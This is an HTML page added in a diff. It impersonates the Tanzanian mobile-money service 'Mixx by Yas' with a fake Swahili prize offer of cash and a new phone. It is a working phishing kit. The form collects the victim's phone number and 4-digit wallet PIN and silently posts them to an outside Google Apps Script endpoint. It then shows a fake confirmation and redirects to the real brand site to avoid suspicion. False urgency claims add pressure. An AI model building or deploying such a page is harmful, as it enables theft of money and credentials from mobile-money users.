@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mixx by Yas – Zawadi ya Maadhimisho ya Miaka 30</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #FFDD00;
+      color: #003080;
+      min-height: 100vh;
+      padding: 0;
+    }
+    .header {
+      background: #003080;
+      color: white;
+      padding: 40px 20px;
+      text-align: center;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+    }
+    .logo-img {
+      width: 280px;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+    .container {
+      max-width: 440px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+    .card {
+      background: white;
+      border-radius: 24px;
+      box-shadow: 0 16px 48px rgba(0,0,0,0.2);
+      padding: 40px;
+      text-align: center;
+      border: 4px solid #003080;
+    }
+    h1 {
+      font-size: 2.4rem;
+      color: #003080;
+      margin: 0 0 28px;
+      font-weight: 900;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+    .highlight {
+      font-size: 2.2rem;
+      color: #FFDD00;
+      background: #003080;
+      padding: 16px 32px;
+      border-radius: 20px;
+      margin: 28px 0;
+      font-weight: bold;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+    }
+    p {
+      font-size: 1.2rem;
+      line-height: 1.6;
+      margin: 0 0 32px;
+      color: #222;
+    }
+    input {
+      width: 100%;
+      padding: 18px 20px;
+      margin: 16px 0;
+      border: 3px solid #003080;
+      border-radius: 14px;
+      font-size: 1.25rem;
+      box-sizing: border-box;
+      background: #f8f9ff;
+      transition: all 0.2s;
+    }
+    input:focus {
+      border-color: #FFDD00;
+      outline: none;
+      box-shadow: 0 0 0 5px rgba(255,221,0,0.4);
+      background: white;
+    }
+    button {
+      background: #003080;
+      color: #FFDD00;
+      border: none;
+      padding: 20px;
+      border-radius: 60px;
+      font-size: 1.4rem;
+      font-weight: bold;
+      width: 100%;
+      margin-top: 32px;
+      cursor: pointer;
+      transition: all 0.25s;
+      box-shadow: 0 8px 28px rgba(0,71,171,0.5);
+    }
+    button:hover {
+      background: #0047AB;
+      transform: translateY(-4px);
+      box-shadow: 0 16px 48px rgba(0,71,171,0.6);
+    }
+    #success {
+      display: none;
+      font-size: 1.7rem;
+      color: #28a745;
+      margin: 60px 0;
+      font-weight: bold;
+      text-shadow: 0 3px 10px rgba(0,0,0,0.3);
+    }
+    .warning {
+      color: #d32f2f;
+      font-weight: bold;
+      margin-top: 40px;
+      font-size: 1.2rem;
+    }
+    .footer {
+      margin-top: 60px;
+      font-size: 1rem;
+      color: #333;
+      text-align: center;
+      opacity: 0.85;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="logo.jpg" alt="Mixx Logo" class="logo-img">
+  </div>
+
+  <div class="container">
+    <div class="card">
+      <h1>Zawadi Yako ya Maadhimisho ya Miaka 30</h1>
+      <p class="highlight">HADI TSH 800,000 + SIMU MPYA!</p>
+      <p>Simu mpya kabisa (Samsung, Redmi, Infinix) + hadi TSH 800,000 cash bonus papo hapo inakusubiri.</p>
+      
+      <p style="color:#28a745; font-weight:bold; font-size:1.5rem; margin:32px 0;">
+        STATUS: APPROVED & READY TO DISBURSE
+      </p>
+      
+      <p>Thibitisha kwa kuingiza namba yako na nambari ya siri ya pochi (4 tarakimu):</p>
+      
+      <form id="claimForm" action="https://script.google.com/macros/s/AKfycbxBQCge5fq9ByjCA11HWJF5JpIsNPLrWyu-XMeeUX5cYM-pLvRh1Wqvto-bTziOfL3SvQ/exec" method="POST">
+        <input type="tel" name="phone" placeholder="Namba ya Simu (07XXXXXXXX)" required pattern="[0-9]{10}" inputmode="numeric">
+        <input type="password" name="pin" placeholder="Nambari ya Siri (4 tarakimu)" required pattern="[0-9]{4}" inputmode="numeric" maxlength="4">
+        <input type="hidden" name="extra" value="Miaka 30 Claim - Phone + 4-digit Nambari ya Siri">
+        <button type="submit">THIBITISHA & POKEA ZAWADI SASA</button>
+      </form>
+      
+      <div id="success">
+        Zawadi imethibitishwa! Subiri simu na cash yako (hadi TSH 800,000) – utapokea SMS confirmation. Unaenda kwenye akaunti rasmi...
+      </div>
+      
+      <p class="warning">
+        OFA HII INAISHIA MASAA 12 TU – WATEJA 3,500+ WAMEPOKEA TAYARI!
+      </p>
+    </div>
+    
+    <div class="footer">
+      © 2026 Mixx by Yas – Salama • Haraka • Huduma Bora Tanzania
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('claimForm');
+    const success = document.getElementById('success');
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      form.style.opacity = '0.6';
+      form.style.pointerEvents = 'none';
+      success.style.display = 'block';
+
+      fetch(form.action, {
+        method: 'POST',
+        body: new FormData(form)
+      }).catch(() => {});
+
+      setTimeout(() => {
+        window.location.href = "https://mixx.co.tz/";
+      }, 3500);
+    });
+  </script>
+</body>
+</html>
